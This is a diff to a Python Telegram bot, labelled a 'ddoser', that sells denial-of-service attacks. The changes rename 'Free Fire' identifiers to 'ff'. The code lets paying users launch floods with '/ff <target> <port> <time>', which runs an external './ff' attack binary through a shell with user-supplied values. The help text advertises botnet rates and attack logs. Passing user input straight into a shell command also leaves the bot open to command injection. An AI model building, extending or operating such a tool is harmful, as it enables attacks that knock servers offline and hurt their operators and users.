@@ -1,4 +1,4 @@
-#Free Fireddoserpython
+#ddoserpython
 
 import telebot
 import subprocess
@@ -283,24 +283,24 @@ def start_attack_reply(message, target, port, time):
     bot.reply_to(message, response)
 
 # Dictionary to store the last time each user ran the /ff command
-Free Fire_cooldown = {}
+ff_cooldown = {}
 
 COOLDOWN_TIME =0
 
 # Handler for /ff command
 @bot.message_handler(commands=['ff'])
-def handle_Free Fire(message):
+def handle_ff(message):
     user_id = str(message.chat.id)
     if user_id in allowed_user_ids:
         # Check if the user is in admin_id (admins have no cooldown)
         if user_id not in admin_id:
             # Check if the user has run the command before and is still within the cooldown period
-            if user_id in Free Fire_cooldown and (datetime.datetime.now() - Free Fire_cooldown[user_id]).seconds < COOLDOWN_TIME:
+            if user_id in ff_cooldown and (datetime.datetime.now() - ff_cooldown[user_id]).seconds < COOLDOWN_TIME:
                 response = "You Are On Cooldown ❌. Please Wait 10sec Before Running The /ff Command Again."
                 bot.reply_to(message, response)
                 return
             # Update the last time the user ran the command
-            Free Fire_cooldown[user_id] = datetime.datetime.now()
+            ff_cooldown[user_id] = datetime.datetime.now()
         
         command = message.text.split()
         if len(command) == 4:  # Updated to accept target, time, and port
@@ -315,7 +315,7 @@ def handle_Free Fire(message):
                 start_attack_reply(message, target, port, time)  # Call start_attack_reply function
                 full_command = f"./ff {target} {port} {time} 500"
                 process = subprocess.run(full_command, shell=True)
-                response = f"Free Fire Attack Finished. Target: {target} Port: {port} Time: {time}"
+                response = f"ff Attack Finished. Target: {target} Port: {port} Time: {time}"
                 bot.reply_to(message, response)  # Notify the user that the attack is finished
         else:
             response = "✅ Usage :- /ff <target> <port> <time>"  # Updated command syntax
@@ -325,7 +325,7 @@ def handle_Free Fire(message):
     bot.reply_to(message, response)
 
 
-# Add /mylogs command to display logs recorded for Free Fire and website commands
+# Add /mylogs command to display logs recorded for ff and website commands
 @bot.message_handler(commands=['mylogs'])
 def show_command_logs(message):
     user_id = str(message.chat.id)
@@ -348,7 +348,7 @@ def show_command_logs(message):
 @bot.message_handler(commands=['help'])
 def show_help(message):
     help_text ='''🤖 Available commands:
-💥 /ff : Method For Free Fire Servers. 
+💥 /ff : Method For ff Servers. 
 💥 /rules : Please Check Before Use !!.
 💥 /mylogs : To Check Your Recents Attacks.
 💥 /plan : Checkout Our Botnet Rates.
